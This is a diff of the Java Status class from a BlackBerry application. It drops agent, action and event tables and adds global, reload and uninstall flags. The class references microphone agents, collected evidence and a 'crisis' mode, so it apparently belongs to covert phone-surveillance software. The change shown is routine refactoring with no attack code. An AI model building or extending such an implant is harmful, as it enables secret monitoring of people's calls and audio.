@@ -14,13 +14,11 @@ import java.util.Date;
 import net.rim.blackberry.api.phone.Phone;
 import net.rim.blackberry.api.phone.PhoneCall;
 import net.rim.device.api.system.RuntimeStore;
-import net.rim.device.api.util.IntHashtable;
-import blackberry.action.Action;
 import blackberry.agent.CrisisAgent;
 import blackberry.agent.MicAgent;
+import blackberry.config.Globals;
 import blackberry.debug.Debug;
 import blackberry.debug.DebugLevel;
-import blackberry.event.Event;
 import blackberry.evidence.Evidence;
 import blackberry.interfaces.Singleton;
 import blackberry.utils.BlockingQueueTrigger;
@@ -37,18 +35,6 @@ public final class Status implements Singleton {
 
     public boolean applicationAgentFirstRun;
 
-    /** The agents. */
-    IntHashtable agents;
-
-    /** The actions. */
-    IntHashtable actions;
-
-    /** The events. */
-    IntHashtable events;
-
-    /** The parameters. */
-    IntHashtable parameters;
-
     /** The instance. */
     private static Status instance;
 
@@ -58,6 +44,8 @@ public final class Status implements Singleton {
     //Object lockTriggerAction = new Object();
 
     Date startingDate;
+
+    Globals globals;
 
     /**
      * Gets the single instance of Status.
@@ -93,15 +81,14 @@ public final class Status implements Singleton {
     public boolean gprs;
     public boolean wifi;
 
+    boolean reload;
+
     /**
      * Instantiates a new status.
      */
     private Status() {
         startingDate = new Date();
     }
-
-
-
 
     /**
      * Clear.
@@ -113,14 +100,12 @@ public final class Status implements Singleton {
 
         triggeredActionsFast.close();
         triggeredActionsMain.close();
-        
-        agents.clear();
-        actions.clear();
-        events.clear();
-        parameters.clear();
+
+        globals = null;
+        uninstall = false;
+        reload = false;
 
     }
-
 
     private int crisisType;
 
@@ -136,10 +121,9 @@ public final class Status implements Singleton {
         debug.info("set crisis: " + type);
         //#endif
 
-       
-            final MicAgent micAgent = MicAgent.getInstance();
-            micAgent.crisis(crisisMic());
-        
+        final MicAgent micAgent = MicAgent.getInstance();
+        micAgent.crisis(crisisMic());
+
     }
 
     public boolean callInAction() {
@@ -190,8 +174,6 @@ public final class Status implements Singleton {
         }
     }
 
-   
-   
     /**
      * Start crisis.
      */
@@ -219,50 +201,22 @@ public final class Status implements Singleton {
     public Trigger getTriggeredActionFast() {
         return triggeredActionsFast.getTriggeredAction();
     }
-    
+
     public Trigger getTriggeredActionMain() {
         return triggeredActionsMain.getTriggeredAction();
     }
-    
+
     public BlockingQueueTrigger getTriggeredQueueFast() {
         return triggeredActionsFast;
     }
-    
+
     public BlockingQueueTrigger getTriggeredQueueMain() {
         return triggeredActionsMain;
     }
 
- 
-    /**
-     * Trigger action.
-     * 
-     * @param actionId
-     *            the action id
-     * @param event
-     *            the event
-     * @return true, if successful
-     */
-    public synchronized boolean triggerAction(final int actionId,
-            final Event event) {
-        //#ifdef DEBUG
-        debug.trace("TriggerAction:" + actionId);
-        //#endif
-
-        if (actionId != Action.ACTION_NULL && actions.containsKey(actionId)) {
-            final Action action = (Action) actions.get(actionId);
-            action.trigger(event);
-            return true;
-        } else {
-            //#ifdef DEBUG
-            debug.error("TriggerAction FAILED " + actionId);
-            //#endif
-            return false;
-        }
-    }
-
     public synchronized void unTriggerAll() {
-       triggeredActionsFast.unTriggerAll();
-       triggeredActionsMain.unTriggerAll();
+        triggeredActionsFast.unTriggerAll();
+        triggeredActionsMain.unTriggerAll();
     }
 
     public Date getStartingDate() {
@@ -319,6 +273,8 @@ public final class Status implements Singleton {
     }
 
     String currentForegroundAppMod = "";
+
+    public boolean uninstall;
 
     public String getCurrentForegroundAppMod() {
         return currentForegroundAppMod;
